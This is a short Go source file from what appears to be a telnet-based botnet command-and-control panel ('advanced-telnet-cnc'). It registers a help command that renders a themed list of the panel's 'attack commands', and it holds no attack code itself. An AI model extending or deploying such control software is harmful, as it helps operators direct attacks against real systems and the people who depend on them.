package commands

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"help", "?"},
		Description: "Provides a list of all available attack commands.",
		Admin:       false,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			return fx.Execute(session.Theme.Name+"/help.lufx", true, fx.Elements(nil))
		},
	})
}
